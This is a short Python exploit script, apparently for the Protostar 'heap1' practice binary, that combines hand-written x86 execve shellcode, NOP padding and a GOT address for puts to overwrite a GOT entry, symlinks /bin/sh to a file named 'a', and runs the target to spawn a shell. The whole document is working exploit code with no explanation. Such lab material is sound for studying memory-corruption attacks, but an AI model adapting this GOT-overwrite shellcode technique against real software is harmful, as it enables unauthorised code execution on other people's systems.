import sys
import subprocess
import os

buf = "\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80"

pad = "\x90"*6

GOTPutsAddr = "\x74\x97\x04\x08" #0x8049774

GOTVal = "\x18\xa0\x04\x08" #0x0804a018

print("[*] Lets pop a shell pinky!")
print("[*] Creating Link: a -> /bin/sh")
os.system("ln -s /bin/sh a")
arg1 = buf+pad+GOTPutsAddr
arg2 = GOTVal
print("[*] Popping Shell!")
subprocess.call(["/root/protostar/heap1/heap1",arg1,arg2])

